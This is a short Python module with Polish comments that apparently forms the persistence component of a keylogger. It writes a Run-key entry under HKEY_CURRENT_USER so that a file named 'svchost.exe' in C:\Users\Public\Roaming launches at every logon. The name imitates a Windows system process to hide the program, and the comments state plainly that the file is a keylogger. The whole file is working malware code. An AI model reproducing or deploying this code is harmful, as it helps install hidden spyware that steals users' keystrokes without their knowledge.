import winreg as reg
import os


class AutoStartRegEdit():
    def __init__(self):
        #self.AddToRegistry()
        pass

    def AddToRegistry(self):
        s_name = "svchost.exe"
        # nazwa pliku keyloggera
        addres =(r"C:\Users\Public\Roaming")
        # adres pod którym zostanie umieszczony keylogger
        # klucz dla którego dodajemy wpis rejestru
        # Miejsce w któym dodamy wpis rejestru Software\Microsoft\Windows\CurrentVersion\Run
        key = reg.HKEY_CURRENT_USER
        key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
        address = os.path.join (addres, s_name)
        address = ('"' + address + '"')

        # otwarcie klucza w celu dodania wpisu
        open = reg.OpenKey (key, key_value, 0, reg.KEY_ALL_ACCESS)

        # dodanie wpisu
        reg.SetValueEx (open, "svchost", 0, reg.REG_SZ, address)

        # zamknięcie klucza
        reg.CloseKey (open)

#AutoStartRegEdit()